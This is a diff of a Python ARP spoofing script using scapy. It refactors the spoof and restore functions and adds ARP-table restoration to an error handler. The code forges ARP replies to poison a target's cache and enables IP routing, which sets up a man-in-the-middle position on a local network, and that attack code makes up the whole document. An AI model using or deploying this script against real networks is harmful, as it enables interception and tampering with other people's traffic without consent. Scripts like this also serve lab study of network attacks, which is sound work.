@@ -30,11 +30,14 @@ def get_mac_address(ip):
     return answered_list[0][1].hwsrc
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc=spoof_ip)
+    mac_address = get_mac_address(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
 def restore(dst_ip, src_ip):
-    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=get_mac_address(dst_ip), psrc=src_ip, hwsrc=get_mac_address(src_ip))
+    dst_mac_address=get_mac_address(dst_ip)
+    src_mac_address=get_mac_address(src_ip)
+    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac_address, psrc=src_ip, hwsrc=src_mac_address)
     scapy.send(packet, count=4, verbose=False)
 
 routing_enable()
@@ -57,4 +60,6 @@ except KeyboardInterrupt:
     routing_disable()
 except IndexError:
     print("\n[+] Something went wrong...\n")
+    restore(target_ip, router_ip)
+    restore(router_ip, target_ip)
     routing_disable()
